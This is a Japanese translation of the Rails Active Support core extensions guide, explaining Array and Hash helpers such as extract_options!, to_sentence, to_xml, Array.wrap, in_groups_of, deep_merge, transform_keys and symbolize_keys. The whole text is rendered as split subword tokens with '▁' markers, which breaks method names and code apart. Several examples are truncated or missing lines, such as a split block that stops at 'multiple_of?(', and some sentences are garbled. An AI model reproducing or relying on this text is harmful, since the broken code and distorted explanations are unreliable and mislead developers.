▁このメソッドは 、` Array # un sh if t ` の別名 です 。
▁% w ( a ▁ b ▁c ▁d ). pre p end (' e ') ▁# ▁=> ▁% w ( e ▁a ▁ b ▁c ▁d )
▁[ ] . pre p end ( 10 ) ▁# ▁=> ▁[ 10 ]
▁NOT E : ▁ 定義ファイル の場所は ` active _ support / core _ ext / array / pre p end _ and _ app end . rb ` です 。
▁#### ▁` app end `
▁このメソッドは 、` Array # < < ` の別名 です 。
▁% w ( a ▁ b ▁c ▁d ). app end (' e ') ▁# ▁=> ▁% w ( a ▁ b ▁c ▁d ▁ e )
▁[ ] . app end ( [ 1 , 2 ] ) ▁# ▁=> ▁[ [ 1 , 2 ] ]
▁### ▁ オプション の 展開
▁Ruby では 、 メソッド に 与えられた 最後の 引数 が ハッシュ の場合 、 それ が ` & block ` 引数 である 場合 を 除 いて 、 ハッシュの 波 括 弧 を省略 できます 。
▁ email : ▁ params [: email ] )
▁ このような シ ン タ ッ ク ス シ ュ ガ ー は 、 多 数 ある 引数 が 順序 に 依 存 すること を 避 け 、 名前付き パラメータ を エ ミ ュ レ ート する インターフェイス を 提 供 するために Rails で 多 用 されています 。
▁ 特に 、 末尾 に オプション の ハッシュ を 置 く という のは 定 番 中 の 定 番 です 。
▁しかし 、 ある メソッドが 受け 取 る 引数 の 数 が 固定 されて お らず 、 メソッド 宣言 で ` * ` が 使用されている と 、 そのような 波 括 弧 な し の オプション ハッシュ は 、 引数 の配列 の 末尾 の 要素 になってしまい 、 ハッシュ として 認 識 され なく な ってしまいます 。
▁ このような 場合 、` ext r a ct _ options !
▁ それ が ハッシュ の場合 、 その ハッシュ を取り出し て 返 し 、 それ以外の 場合は 空 の ハッシュ を返します 。
▁` cache s _ action ` コントローラ マクロ で の 定義 を 例 にとって 見 てみましょう 。
▁def ▁ cache s _ action ( * action s )
▁ return ▁ unless ▁ cache _ config ur ed ?
▁ options ▁= ▁ action s . ext r a ct _ options !
▁このメソッドは 、 任意の 数 の アクション 名を 引数に 取 る ことができ 、 引数 の 末尾 項目 で オプション ハッシュ を使用できます 。
▁` ext r a ct _ options !` メソッドを使用すると 、 この オプション ハッシュ を取り出し 、` action s ` から 取り 除 く ことが 簡単 かつ 明示的に 行 え ます 。
▁NOT E : ▁ 定義ファイル の場所は ` active _ support / core _ ext / array / ext r a ct _ options . rb ` です 。
▁#### ▁` to _ s ent en ce `
▁` to _ s ent en ce ` メソッドは 、 配列 を 変 換 して 、 要素 を 列 挙 する 英 文 に します 。
▁% w ( ). to _ s ent en ce ▁# ▁=> ▁" "
▁% w ( E ar th ). to _ s ent en ce ▁# ▁=> ▁" E ar th "
▁% w ( E ar th ▁ W in d ). to _ s ent en ce ▁# ▁=> ▁" E ar th ▁and ▁ W in d "
▁% w ( E ar th ▁ W in d ▁F ir e ). to _ s ent en ce ▁# ▁=> ▁" E ar th , ▁ W in d , ▁and ▁F ir e "
▁このメソッドは 3 つの オプションを 受け 付け ます 。
▁* ▁`: two _ word s _ connect or `: ▁ 項目 数 が 2 つの 場合 の 接続 詞 を指定します 。
▁デフォルトは " ▁and ▁" です 。
▁* ▁`: word s _ connect or `: ▁3 つ 以上 の 要素 を 接続 する 場合 、 最後の 2 つの 間 以外 で 使われ る 接続 詞 を指定します 。
▁デフォルトは ", ▁" です 。
▁* ▁`: last _ word _ connect or `: ▁3 つ 以上 の 要素 を 接続 する 場合 、 最後の 2 つの 要素 で使用する 接続 詞 を指定します 。
▁デフォルトは ", ▁and ▁" です 。
▁これらの オプションは 標準 の 方法で ロー カ ラ イ ズ できます 。 使用する キー は 以下の とおりです 。
▁| ▁ オプション ▁| ▁I 18 n ▁ キー ▁|
▁| ▁ ----------- ----------- ▁| ▁--------- ----------- --------------- ▁|
▁| ▁`: two _ word s _ connect or ` ▁| ▁` support . array . two _ word s _ connect or ` ▁|
▁| ▁`: word s _ connect or ` ▁| ▁` support . array . word s _ connect or ` ▁|
▁| ▁`: last _ word _ connect or ` ▁| ▁` support . array . last _ word _ connect or ` ▁|
▁NOT E : ▁ 定義ファイル の場所は ` active _ support / core _ ext / array / con version s . rb ` です 。
▁#### ▁` to _ formatted _ s `
▁` to _ formatted _ s ` メソッドは 、 デフォルトで は ` to _ s ` と同様に 振る舞い ます 。
▁ただし 、 配列 の中に ` id ` に応答する 項目 がある場合 は 、`: db ` という シンボル を 引数として 渡す ことで 対応 できる 点が 異なります 。
▁この 手法 は 、 Active ▁Record オブジェクトの コレクション に対して よく 使われ ます 。
▁ 返される 文字列 は 以下の とおりです 。
▁[ ] . to _ formatted _ s (: db ) ▁# ▁=> ▁" null "
▁[ user ] . to _ formatted _ s (: db ) ▁# ▁=> ▁" 8 4 5 6 "
▁invo i ce . line s . to _ formatted _ s (: db ) ▁# ▁=> ▁" 23 , 5 6 7 , 5 5 6 , 12 "
▁上の 例 の 整 数 は 、` id ` への 呼び出し によって 取り 出 された もの と 考え られます 。
▁#### ▁` to _ xml `
▁` to _ xml ` メソッドは 、 レシーバ を XML 表現 に変換 した もの を含む 文字列 を返します 。
▁C ontributor . limit (2) . order (: r an k ). to _ xml
▁ xml ▁ version =" 1 . 0 " ▁ en co d ing =" UT F - 8 " ?
▁# ▁< c ontributor s ▁type =" array ">
▁# ▁< c ontributor >
▁# ▁< id ▁type =" integer "> 4 3 5 6 </ id >
▁# ▁< name > J er e my ▁ K e m per </ name >
▁# ▁< r an k ▁type =" integer "> 1 </ r an k >
▁# ▁< url - id > j er e my - ke m per </ url - id >
▁# ▁</ c ontributor >
▁# ▁< id ▁type =" integer "> 4 4 04 </ id >
▁# ▁< name > David ▁ H e in e me i er ▁ H an s s on </ name >
▁# ▁< r an k ▁type =" integer "> 2 </ r an k >
▁# ▁< url - id > d a v id - h e in e me i er - ha n s s on </ url - id >
▁# ▁</ c ontributor s >
▁ 実際には 、` to _ xml ` を すべての 要素 に 送 り 、 結果を ルート ノ ー ド の下に 集 め ます 。
▁ すべての 要素 が ` to _ xml ` に応答する 必要があります 。 そう で ない場合は 例外が発生します 。
▁ デフォルトで は 、 ルート 要素 の名前 は 最初の 要素 の クラス名 を 複数形 に して アンダースコア 化 ( u nder sc or ize ) と ダ ッ シ ュ 化 ( d as her ize ) を行います 。 残 り の 要素 も 最初の 要素 と同じ 型 ▁( ` is _ a ?` で チェック されます ) ▁ に 属 し 、 ハッシュ でない ことが 前 提 と な っています 。
▁上の 例 で言う と 、 " c ontributor s " です 。
▁ 最初の 要素 と同じ 型 に 属 さ ない 要素 が 1 つ でも ある 場合 、 ルート ノ ー ド には ` objects ` が使用されます 。
▁[ C ontributor . first , ▁ Co m m it . first ] . to _ xml
▁# ▁< objects ▁type =" array ">
▁# ▁< object >
▁# ▁< id ▁type =" integer "> 4 5 8 3 </ id >
▁# ▁< name > A ar on ▁B at al ion </ name >
▁# ▁< r an k ▁type =" integer "> 5 3 </ r an k >
▁# ▁< url - id > a ar on - b at al ion </ url - id >
▁# ▁</ object >
▁# ▁< author > J o sh u a ▁P e e k </ author >
▁# ▁< author ed - timestamp ▁type =" date time "> 200 9 - 0 9 - 0 2 T 16 : 4 4 : 3 6 Z </ author ed - timestamp >
▁# ▁< branch > origin / master </ branch >
▁# ▁< commit ter > J o sh u a ▁P e e k </ commit ter >
▁# ▁< git - show ▁nil =" true " ></ git - show >
▁# ▁< id ▁type =" integer "> 19 0 3 16 </ id >
▁# ▁< im port ed - from - s v n ▁type =" boolean "> false </ im port ed - from - s v n >
▁# ▁< message > K i ll ▁A M o ▁ o b s er v ing ▁ w r a p _ with _ not if i cat ions ▁ since ▁A Re s ▁ w as ▁ only ▁ us ing ▁it </ message >
▁# ▁< s ha 1> 7 23 a 4 7 b f b 3 7 08 f 9 6 88 2 1 b c 9 6 9 a 9 a 3 f c 8 7 3 a 3 ed 5 8 </ s ha 1>
▁# ▁</ objects >
▁ レシーバ が ハッシュ の配列 である 場合 、 ルート 要素 はデフォルトで ` objects ` になります 。
▁[ { a : ▁1, ▁ b : ▁2 } , ▁ { c : ▁3 } ] . to _ xml
▁# ▁< b ▁type =" integer "> 2 </ b >
▁# ▁< a ▁type =" integer "> 1 </ a >
▁# ▁< c ▁type =" integer "> 3 </ c >
▁WARN ING : ▁ コレクション が 空 の場合 、 ルート 要素 はデフォルトで " nil クラス " になります 。
▁ ここ から わかるように 、 たとえば 上の 例 で の c ontributor s の リスト の ルート 要素 は 、 コレクション が も し 空 であれば ▁" c ontributor s " ▁ ではなく ▁" nil クラス " ▁ になっ てしまう ということです 。
▁`: root ` オプション を使用することで 一 貫 した ルート 要素 を使用する こともできます 。
▁ 子 ノ ー ド の名前 は 、 デフォルトで は ルート ノ ー ド を 単数形 にしたもの が使用されます 。
▁上の 例 で言う と " c ontributor " や " object " です 。
▁`: ch il d re n ` オプション を使用すると 、 これら を ノ ー ド 名 として 設定 できます 。
▁ デフォルトの XML ビ ル ダ は 、` B u il de r :: X m l M ar k up ` から 直接 生成された インスタンス です 。
▁`: builder ` オ ブ ション を使用することで 、 独自の ビ ル ダ を 構成 できます 。
▁このメソッド では `: d as her ize ` と その 同 族 と同様 の オプション が 使用できます 。 それらの オプションは ビ ル ダ に 転 送 されます 。
▁C ontributor . limit (2) . order (: r an k ). to _ xml ( skip _ type s : ▁true )
▁# ▁< c ontributor s >
▁# ▁< id > 4 3 5 6 </ id >
▁# ▁< r an k > 1 </ r an k >
▁# ▁< id > 4 4 04 </ id >
▁# ▁< r an k > 2 </ r an k >
▁### ▁ ラ ッ ピ ング
▁` Array . w r a p ` メソッドは 、 配列 の中に ある 引数 が 配列 ▁( または 配列 のような もの ) ▁ になっ ていない 場合に 、 それら を 配列 の中に ラ ッ プ します 。
▁ 特 徴 :
▁* ▁ 上 記 以外の 場合 で 、 引数 が ` to _ ary ` に応答する 場合は ` to _ ary ` が 呼び出され 、` to _ ary ` の 値が ` nil ` で ない場合は その 値 が返されます 。
▁* ▁ 上 記 以外の 場合 、 引数 を 内 側 に 含 んだ 配列 ▁( 要素 が 1 つ だけ の配列 ) ▁ が返されます 。
▁ Array . w r a p ( nil ) ▁# ▁=> ▁[ ]
▁ Array . w r a p ( [ 1 , ▁ 2, ▁3 ] ) ▁# ▁=> ▁[1, ▁ 2, ▁3 ]
▁ Array . w r a p ( 0 ) ▁# ▁=> ▁[ 0 ]
▁このメソッド の 目的 は ` K er n e l # Array ` と似ています が 、 いくつかの 相 違 点 があります 。
▁* ▁ 引数 が ` to _ ary ` に応答する 場合 、 このメソッド が 呼び出され ます 。
▁* ▁` to _ ary ` から 返 された 値が ` nil ` でも ` Array ` オブジェクト でも ない場合 、` K er n e l # Array ` は 例外を発生 します が 、` Array . w r a p ` は 例外を発生 せずに 単 に その 値 を返します 。
▁ 最後の 性 質 は 、 列 挙 型 同士 を 比 較 する 場合に 特に 便利です 。
▁ Array . w r a p ( foo : ▁: bar ) ▁# ▁=> ▁[ { : foo => : bar } ]
▁ Array ( foo : ▁: bar ) ▁# ▁=> ▁[ [: foo , ▁: bar ] ]
▁この 動作 は 、 ス プ ラ ッ ト 演算子 を使用する 手法 にも 関連 します 。
▁[ * object ]
▁ 上 は Ruby ▁1. 8 の場合 、` nil ` に対して ` [ nil ] ` を返し 、 それ以外の 場合には ` Array ( object ) ` を呼び出します
▁( 1 . 9 の contact 機能 の 正 確 な 動作 を 理解 している ことが 前 提 です )。
▁従って 、 この場合 ` nil ` に対する 動作 は 異 なり 、 上で 説明 されている ` K er n e l # Array ` についても この 異なる 動作 が 残 り の ` object ` に適用 されます 。
▁NOT E : ▁ 定義ファイル の場所は ` active _ support / core _ ext / array / w r a p . rb ` です 。
▁### ▁ 複 製
▁` Array . deep _ dup ` メソッドは 、 自分自身 を 複 製 すると 同時に 、 その 中 の すべての オブジェクトを Active ▁Support の ` Object # deep _ dup ` メソッド によって 再 帰 的に 複 製 します 。
▁この 動作 は 、` Array # ma p ` を使用して ` deep _ dup ` メソッドを 内部 の 各 オブジェクト に適用 する の と似ています 。
▁ array ▁= ▁[1, ▁[ 2, ▁3 ] ]
▁ dup ▁= ▁ array . deep _ dup
▁ dup [ 1 ] [ 2 ] ▁= ▁4
▁ array [ 1 ] [ 2 ] ▁= = ▁nil ▁# ▁=> ▁true
▁### ▁ グループ 化
▁#### ▁` in _ group s _ of ( number , ▁ fi ll _ with ▁= ▁nil ) `
▁` in _ group s _ of ` メソッドは 、 指定 の サイズ で 配列 を 連 続 した グループ に 分割 します 。
▁ 分割 された グループ を 内 包 する 配列 を 1 つ 返します 。
▁[1, ▁ 2, ▁3 ] . in _ group s _ of (2) ▁# ▁=> ▁[ [ 1 , ▁2 ] , ▁[ 3, ▁nil ] ]
▁ ブロック が 渡 された 場合は yield します 。
▁<% ▁ sample . in _ group s _ of ( 3 ) ▁do ▁| a , ▁ b , ▁c | ▁%>
▁< td > <%= ▁a ▁%></ td >
▁< td > <%= ▁ b ▁%></ td >
▁< td > <%= ▁c ▁%></ td >
▁ 最初の 例 では 、` in _ group s _ of ` メソッドは 最後の グループ を なるべく ` nil ` 要素 で 埋 め 、 指定 の サイズ を 満 た す ようにしています 。
▁ 空 き を 埋 め る 値 は 2 番目の オプション 引数 で 指定できます 。
▁[1, ▁ 2, ▁3 ] . in _ group s _ of ( 2, ▁0 ) ▁# ▁=> ▁[ [ 1 , ▁2 ] , ▁[ 3, ▁0 ] ]
▁2 番目の オプション 引数に ` false ` を 渡す と 、 最後の グループ の 空 き は 詰 め られます 。
▁[1, ▁ 2, ▁3 ] . in _ group s _ of ( 2, ▁false ) ▁# ▁=> ▁[ [ 1 , ▁2 ] , ▁[ 3 ] ]
▁従って 、` false ` は 空 き を 埋 め る 値 として は 使用 できません 。
▁NOT E : ▁ 定義ファイル の場所は ` active _ support / core _ ext / array / group ing . rb ` です 。
▁#### ▁` in _ group s ( number , ▁ fi ll _ with ▁= ▁nil ) `
▁` in _ group s ` は 、 配列 を 指定 の 個 数 の グループ に 分割 します 。
▁ 分割 された グループ を 内 包 する 配列 を 1 つ 返します 。
▁% w ( 1 ▁2 ▁3 ▁4 ▁5 ▁ 6 ▁ 7 ). in _ group s ( 3 )
▁# ▁=> ▁[ [ "1" , ▁" 2 ", ▁" 3 "] , ▁[" 4 ", ▁" 5 ", ▁nil ] , ▁[" 6 ", ▁" 7 ", ▁nil ] ]
▁% w ( 1 ▁2 ▁3 ▁4 ▁5 ▁ 6 ▁ 7 ). in _ group s ( 3 ) ▁ { | group | ▁ p ▁ group }
▁[" 1 ", ▁" 2 ", ▁" 3 "]
▁[" 4 ", ▁" 5 ", ▁nil ]
▁[" 6 ", ▁" 7 ", ▁nil ]
▁この 例 では 、` in _ group s ` メソッドは 一部の グループ の 後 ろ を 必要に応じて ` nil ` 要素 で 埋 め ている の が わかり ます 。
▁また 、 そのような 値 を持つ グループ は 、 常に 全体 の中で 最後の グループ になります 。
▁% w ( 1 ▁2 ▁3 ▁4 ▁5 ▁ 6 ▁ 7 ). in _ group s ( 3, ▁" 0 ")
▁# ▁=> ▁[ [ "1" , ▁" 2 ", ▁" 3 "] , ▁[" 4 ", ▁" 5 ", ▁" 0 "] , ▁[" 6 ", ▁" 7 ", ▁" 0 "] ]
▁2 番目の オプション 引数に ` false ` を 渡す と 、 要素 の 個 数 の 少 ない グループ の 空 き は 詰 め られます 。
▁% w ( 1 ▁2 ▁3 ▁4 ▁5 ▁ 6 ▁ 7 ). in _ group s ( 3, ▁false )
▁# ▁=> ▁[ [ "1" , ▁" 2 ", ▁" 3 "] , ▁[" 4 ", ▁" 5 "] , ▁[" 6 ", ▁" 7 "] ]
▁#### ▁` s p li t ( value ▁= ▁nil ) `
▁` s p li t ` メソッドは 、 指定 の セ パ レ ー タ で 配列 を 分割 し 、 分割 された チ ャ ン ク を返します 。
▁ ブロック を 渡 した 場合 、 配列 の 要素 のうち ブロック が true を返す 要素 が セ パ レ ー タ として 使用されます 。
▁( - 5 . . 5 ). to _ a . s p li t ▁ { ▁| i | ▁ i . m ulti p le _ of ? (
▁# ▁=> ▁[ [ - 5 ] , ▁[ - 3, ▁- 2, ▁- 1 ] , ▁[1, ▁ 2, ▁3 ] , ▁[ 5 ] ]
▁ ブロック を 渡 さ ない場合 、 引数として 受け 取 った 値が セ パ レ ー タ として 使用されます 。 デフォルトの セ パ レ ー タ は ` nil ` です 。
▁[ 0, ▁1, ▁- 5 , ▁1, ▁1, ▁" foo ", ▁" bar "] . s p li t (1)
▁# ▁=> ▁[ [ 0 ] , ▁[ - 5 ] , ▁[ ] , ▁[" foo ", ▁" bar "] ]
▁ TIP : ▁上の 例 から も わかるように 、 セ パ レ ー タ が 連 続 すると 空 の配列 になります 。
▁` Hash ` の 拡 張
▁ { " foo " ▁=> ▁1, ▁" bar " ▁=> ▁2 } . to _ xml
▁# ▁< hash >
▁# ▁< foo ▁type =" integer "> 1 </ foo >
▁# ▁< bar ▁type =" integer "> 2 </ bar >
▁# ▁</ hash >
▁ 具体的には 、 このメソッドは 与えられた ペ ア から ▁ _ 値 _ ▁ に応じて ノ ー ド を作成します 。
▁ キー と 値 の ペ ア が与えられ たとき 、 以下のように 動作します 。
▁* ▁ 値が ハッシュ のとき 、 キー を `: root ` として 再 帰 的な 呼び出し を行います 。
▁* ▁ 値が 配列 の場合 、 キー を `: root ` に 、 キー を 単数形 化 ▁( s ing ul ar ize ) ▁ した もの を `: ch il d re n ` に 指定 して 再 帰 的な 呼び出し を行います 。
▁* ▁ 値が 呼び出し 可能な ▁( c all able ) ▁ オブジェクト の場合 、 引数 が 1 つ または 2 つ 必要 です 。
▁ 引数 の 数 に応じて ▁( ar ity メソッドで 確認 ) 、 呼び出し 可能 オブジェクト を呼び出します 。 第 1 引数に は `: root ` に キー を 指定 した もの 、 第 2 引数に は キー を 単数形 化 した もの が使用されます 。
▁ 戻り値 は 新しい ノ ー ド です 。
▁* ▁` value ` が ` to _ xml ` メソッド に応答する 場合 、`: root ` に キー が 指定 されます 。
▁* ▁ その他 の場合 、` key ` を 持 ち 、 ノ ー ド が タグ として 作成されます 。 その ノ ー ド には ` value ` を 文字列 形式 にしたもの が テキスト ノ ー ド として 追加 されます 。
▁` value ` が ` nil ` の場合 、 " nil " 属性 が " true " に 設定 された もの が追加され ます 。
▁`: skip _ type s ` オプション が true でない ▁( または `: skip _ type s ` オプション がない ) ▁ 場合 、 以下のような マッピング で " type " 属性 も 追加 されます 。
▁ XML _ T Y P E _ N A M E S ▁= ▁ {
▁" S y m b ol " ▁=> ▁" symbol ",
▁" B ig D ec im al " ▁=> ▁" de c im al ",
▁" F lo at " ▁=> ▁" f lo at ",
▁" T r u e Class " ▁=> ▁" boolean ",
▁" F al s e Class " ▁=> ▁" boolean ",
▁" Date " ▁=> ▁" date ",
▁" DateTime " ▁=> ▁" date time ",
▁" Time " ▁=> ▁" date time "
▁ デフォルトで は ルート ノ ー ド は " hash " ですが 、`: root ` オプション を使用して カスタマイズ できます 。
▁`: builder ` オ ブ ション を使用することで 、 独自の ビ ル ダ を 構成 できます 。
▁このメソッド では `: d as her ize ` と その 同 族 と同様 の オプション が 使用できます 。 それらの オプションは ビ ル ダ に 転 送 されます 。
▁NOT E : ▁ 定義ファイル の場所は ` active _ support / core _ ext / hash / con version s . rb ` です 。
▁### ▁ マージ
▁Ruby には 、 2 つの ハッシュ を マージ する ビルトイン の ` Hash # merge ` メソッド があります 。
▁ { a : ▁1, ▁ b : ▁1 } . merge ( a : ▁ 0, ▁c : ▁2 )
▁# ▁=> ▁ { : a => 0, ▁: b => 1 , ▁: c => 2 }
▁Active ▁Support では 、 この 他にも 便利な ハッシュの マージ を いくつか 提供し ています 。
▁#### ▁` reverse _ merge ` と ` reverse _ merge !
▁ キー が 衝 突 した 場合 、 引数 の ハッシュの キー が ` merge ` では 優 先 されます 。
▁ 以下のような 定 形 の 手法 を使用することで 、 デフォルト値 を持つ オプション ハッシュ を コ ン パ ク ト に サポート できます 。
▁ options ▁= ▁ { length : ▁3 0, ▁ o m is s ion : ▁" ... "} . merge ( options )
▁Active ▁Support では 、 別の 記 法 を 使い たい 場合 のために ` reverse _ merge ` も 定義 されています 。
▁ options ▁= ▁ options . reverse _ merge ( length : ▁3 0, ▁ o m is s ion : ▁" ... ")
▁ マージ を 対象 内で 行なう 破 壊 的な バージョンの ` reverse _ merge !` もあります 。
▁ length : ▁3 0, ▁ o m is s ion : ▁" ... ")
▁WARN ING : ▁` reverse _ merge !` は 呼び出し 元の ハッシュ を変更する 可能性 がある ことにご注意ください 。 それ が 意 図 した 副 作 用 である か そう でない か に か か わ らず 、 注意 が必要です 。
▁NOT E : ▁ 定義ファイル の場所は ` active _ support / core _ ext / hash / reverse _ merge . rb ` です 。
▁#### ▁` reverse _ update `
▁` reverse _ update ` メソッドは 、 上 で説明した ` reverse _ merge !` の別名 です 。
▁WARN : ▁` reverse _ update ` には 破 壊 的な バージョン はありません 。
▁#### ▁` deep _ merge ` と ` deep _ merge !
▁ 先 の例 で説明した とおり 、 キー が レシーバ と 引数 で 重複 している 場合 、 引数 の 側 の 値が 優 先 されます 。
▁Active ▁Support では ` Hash # deep _ merge ` が 定義 されています 。
▁ デ ィ ー プ マージ では 、 レシーバ と 引数 の 両方 に 同じ キー が 出 現 し 、 さらに どちら も 値が ハッシュ である 場合に 、 その 下 位 の ハッシュ を ▁ _ マージ _ ▁ した もの が 、 最終的な ハッシュ で 値 として 使用されます 。
▁ { a : ▁ { b : ▁1 } } . deep _ merge ( a : ▁ { c : ▁2 })
▁# ▁=> ▁ { : a => { : b => 1 , ▁: c => 2 } }
▁` deep _ merge !` メソッドは デ ィ ー プ マージ を 破 壊 的に 実行 します 。
▁NOT E : ▁ 定義ファイル の場所は ` active _ support / core _ ext / hash / deep _ merge . rb ` です 。
▁### ▁ デ ィ ー プ 複 製
▁` Hash . deep _ dup ` メソッドは 、 自分自身 の 複 製 に 加 え て ▁その 中 の すべての キー と 値を 再 帰 的に 複 製 します 。 複 製 には Active ▁Support の ` Object # deep _ dup ` メソッド を使用しています 。
▁この 動作 は 、` E n umerat or # each _ with _ object ` を使用して 下 位 の すべての オブジェクト に ` deep _ dup ` を 送信 する の と似ています 。
▁ hash ▁= ▁ { ▁a : ▁1, ▁ b : ▁ { ▁c : ▁ 2, ▁d : ▁[ 3, ▁4 ] ▁ } ▁ }
▁ dup ▁= ▁ hash . deep _ dup
▁ dup [: b ] [: e ] ▁= ▁5
▁ dup [: b ] [: d ] ▁< < ▁5
▁ hash [: b ] [: e ] ▁= = ▁nil ▁# ▁=> ▁true
▁ hash [: b ] [: d ] ▁= = ▁[ 3, ▁4 ] ▁# ▁=> ▁true
▁### ▁ ハッシュ キー の 操作
▁#### ▁` except ` と ` except !
▁` except ` メソッドは 、 引数 で 指定された キー があれば レシーバ の ハッシュ から 取り 除 きます 。
▁ { a : ▁1, ▁ b : ▁2 } . except (: a ) ▁# ▁=> ▁ { : b => 2 }
▁ レシーバ が ` con ver t _ key ` に応答する 場合 、 このメソッドは すべての 引数 に対して 呼び出され ます 。
▁その おかげで 、` except ` メソッドは たとえば with _ in d if f er ent _ access など で 期待どおり に 動作します 。
▁ { a : ▁1 } . with _ in d if f er ent _ access . except (: a ) ▁# ▁=> ▁ { }
▁ { a : ▁1 } . with _ in d if f er ent _ access . except (" a ") ▁# ▁=> ▁ { }
▁ レシーバ ー から キー を 取り 除 く 破 壊 的な ` except !` もあります 。
▁NOT E : ▁ 定義ファイル の場所は ` active _ support / core _ ext / hash / except . rb ` です 。
▁#### ▁` t ransform _ keys ` と ` t ransform _ keys !
▁` t ransform _ keys ` メソッドは 、 ブロック を 1 つ 取り 、 ハッシュ を 1 つ 返します 。 返される ハッシュ には 、 レシーバ の それぞれの キー に対して ブロック 操作 を 適 用 した 結果 が含まれ ます 。
▁ { nil ▁=> ▁nil , ▁1 ▁=> ▁1, ▁a : ▁: a } . t ransform _ keys ▁ { ▁| key | ▁ key . to _ s . up case ▁ }
▁# ▁=> ▁ { " " ▁=> ▁nil , ▁" A " ▁=> ▁: a , ▁ "1" ▁=> ▁1 }
▁ キー が 重複 している 場合 、 いずれ か の 値が 優 先 されます 。
▁ 優 先 される 値 は 、 同じ ハッシュ が与えられ た場合 であっても 一 定 する 保 証 はありません 。
▁ { " a " ▁=> ▁1, ▁a : ▁2 } . t ransform _ keys ▁ { ▁| key | ▁ key . to _ s . up case ▁ }
▁# ▁以下の どちら になる か は 一 定 では ない
▁# ▁=> ▁ { " A " => 2 }
▁# ▁=> ▁ { " A " => 1 }
▁このメソッドは 、 特殊な 変 換 を行い たい 場合に 便利な ことがあります 。
▁たとえば 、` string if y _ keys ` と ` symbol ize _ keys ` では 、 キー の 変 換 に ` t ransform _ keys ` を使用しています 。
▁def ▁ string if y _ keys
▁t ransform _ keys ▁ { ▁| key | ▁ key . to _ s ▁ }
▁def ▁ symbol ize _ keys
▁t ransform _ keys ▁ { ▁| key | ▁ key . to _ s y m ▁ re sc u e ▁ key ▁ }
▁ レシーバ 自体 の キー に対して 破 壊 的な ブロック 操作 を 適 用 する ` t ransform _ keys !` メソッド もあります 。
▁また 、` deep _ t ransform _ keys ` や ` deep _ t ransform _ keys !` を使用して 、 与えられた ハッシュの すべての キー と 、 その 中に ネスト されている すべての ハッシュ に対して ブロック 操作 を 適 用 することもできます 。
▁ 以下 に 例 を示します 。
▁ { nil ▁=> ▁nil , ▁1 ▁=> ▁1, ▁ n e st ed : ▁ { a : ▁ 3, ▁5 ▁=> ▁5 } } . deep _ t ransform _ keys ▁ { ▁| key | ▁ key . to _ s . up case ▁ }
▁# ▁=> ▁ { " " => nil , ▁ "1" => 1 , ▁" N E S T E D " => { " A " => 3, ▁" 5 " => 5 } }
▁NOT E : ▁ 定義ファイル の場所は ` active _ support / core _ ext / hash / keys . rb ` です 。
▁#### ▁` string if y _ keys ` と ` string if y _ keys !
▁` string if y _ keys ` メソッドは 、 レシーバ の ハッシュ キー を 文字列 に変換 した ハッシュ を返します 。
▁ 具体的には 、 レシーバ の ハッシュ キー に対して ` to _ s ` を送信し ています 。
▁ { nil ▁=> ▁nil , ▁1 ▁=> ▁1, ▁a : ▁: a } . string if y _ keys
▁# ▁=> ▁ { " " ▁=> ▁nil , ▁" a " ▁=> ▁: a , ▁ "1" ▁=> ▁1 }
▁ { " a " ▁=> ▁1, ▁a : ▁2 } . string if y _ keys
▁# ▁=> ▁ { " a " => 2 }
▁# ▁=> ▁ { " a " => 1 }
▁このメソッドは 、 シンボル と 文字列 が 両方 含 まれ ている ハッシュ を オプション として 受け 取 る 場合に 便利な ことがあります 。
▁たとえば 、` ActionView :: Helper s :: Form Helper ` では 以下のように 定義 されています 。
▁def ▁to _ check _ box _ tag ( options ▁= ▁ { } , ▁ check ed _ value ▁= ▁ "1" , ▁ un check ed _ value ▁= ▁" 0 ")
▁ options ▁= ▁ options . string if y _ keys
▁ options [ " type "] ▁= ▁" check box "
▁ string if y _ keys メソッドの おかげで 、 2 行 目 で " type " キー に 安全 にアクセス できます 。 メソッドの 利用 者 は 、`: type ` のような シンボル と " type " のような 文字列 の どちら でも 使用できます 。
▁ レシーバ ー の キー を直接 文字列 化 する 破 壊 的な ` string if y _ keys !` もあります 。
▁また 、` deep _ string if y _ keys ` や ` deep _ string if y _ keys !` を使用して 、 与えられた ハッシュの すべての キー を 文字列 化 し 、 その 中に ネスト されている すべての ハッシュの キー も 文字列 化 することもできます 。
▁ { nil ▁=> ▁nil , ▁1 ▁=> ▁1, ▁ n e st ed : ▁ { a : ▁ 3, ▁5 ▁=> ▁5 } } . deep _ string if y _ keys
▁# ▁=> ▁ { " " => nil , ▁ "1" => 1 , ▁" n e st ed " => { " a " => 3, ▁" 5 " => 5 } }
▁#### ▁` symbol ize _ keys ` と ` symbol ize _ keys !
▁` symbol ize _ keys ` メソッドは 、 レシーバ の ハッシュ キー を シンボル に変換 した ハッシュ を返します 。
▁ 具体的には 、 レシーバ の ハッシュ キー に対して ` to _ s y m ` を送信し ています 。
▁ { nil ▁=> ▁nil , ▁1 ▁=> ▁1, ▁" a " ▁=> ▁" a "} . symbol ize _ keys
▁# ▁=> ▁ { 1 => 1 , ▁nil => nil , ▁: a => " a "}
▁WARN ING : ▁上の 例 では 、 3 つの キー のうち 最後の 1 つ しか シンボル に変換 されていない ことにご注意ください 。 数字 と nil は シンボル になり ません 。
▁ { " a " ▁=> ▁1, ▁a : ▁2 } . symbol ize _ keys
▁# ▁=> ▁ { : a => 2 }
▁# ▁=> ▁ { : a => 1 }
▁たとえば 、` ActionController :: U r l Re write r ` では 以下のように 定義 されています 。
▁def ▁ re write _ path ( options )
▁ options ▁= ▁ options . symbol ize _ keys
▁ options . update ( options [: params ] . symbol ize _ keys ) ▁if ▁ options [: params ]
▁ symbol ize _ keys メソッドの おかげで 、 2 行 目 で `: params ` キー に 安全 にアクセス でき ています 。 メソッドの 利用 者 は 、`: params ` のような シンボル と " params " のような 文字列 の どちら でも 使用できます 。
▁ レシーバ ー の キー を直接 シンボル に変換 する 破 壊 的な ` symbol ize _ keys !` もあります 。
▁また 、` deep _ symbol ize _ keys ` や ` deep _ symbol ize _ keys !` を使用して 、 与えられた ハッシュの すべての キー と 、 その 中に ネスト されている すべての ハッシュの キー を シンボル に変換 することもできます 。
▁ { nil ▁=> ▁nil , ▁1 ▁=> ▁1, ▁" n e st ed " ▁=> ▁ { " a " ▁=> ▁ 3, ▁5 ▁=> ▁5 } } . deep _ symbol ize _ keys
▁# ▁=> ▁ { nil => nil , ▁1 => 1 , ▁ n e st ed : { a : 3, ▁5 => 5 } }
▁#### ▁` to _ options ` と ` to _ options !
▁` to _ options ` メソッドと ` to _ options !` メソッドは 、 それ それ ` symbol ize _ keys ` メソッドと ` symbol ize _ keys !` メソッド の別名 です 。
